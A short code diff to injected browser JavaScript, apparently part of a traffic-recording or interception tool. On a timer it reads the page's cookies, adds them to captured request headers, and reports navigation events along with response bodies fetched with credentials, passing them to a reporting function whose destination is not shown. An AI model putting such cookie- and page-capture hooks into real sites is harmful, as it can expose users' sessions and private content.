@@ -258,21 +258,20 @@ setInterval(function(){
       var ck="";try{ck=main.document.cookie||""}catch(e){}
       var rawH=getBrowserHeaders(main,curUrl);
       if(ck)rawH+="Cookie: "+ck+"\\r\\n";
-      // Fetch page content to get response body for navigation
-      (async function(){
-        try{
-          var res=await fetch(curUrl,{credentials:"include"});
+      // Send navigation event first, then try to fetch response body separately
+      rpt("navigation","GET",curUrl,rawH,null,null,null,null);
+      // Try to fetch page content for response body (may fail due to CORS/redirects)
+      try{
+        fetch(curUrl,{credentials:"include",mode:"same-origin"}).then(function(res){
           var resH="";try{res.headers.forEach(function(v,k){resH+=k+": "+v+"\\r\\n"})}catch(e){}
           var ct=res.headers.get("content-type")||"";
-          var resBody=null;
           if(ct.indexOf("text")>-1||ct.indexOf("html")>-1||ct.indexOf("json")>-1){
-            try{resBody=(await res.text()).substring(0,10000)}catch(e){resBody="[read error]"}
-          }else{resBody="["+ct+"]"}
-          rpt("navigation","GET",curUrl,rawH,null,resH,resBody,res.status);
-        }catch(e){
-          rpt("navigation","GET",curUrl,rawH,null,null,"[fetch error: "+e.message+"]",0);
-        }
-      })();
+            res.text().then(function(body){
+              rpt("navigation","GET",curUrl,rawH,null,resH,body.substring(0,10000),res.status);
+            }).catch(function(){});
+          }
+        }).catch(function(){});
+      }catch(e){}
     }else if(!main.__nxHooked){
       tryInject();
     }
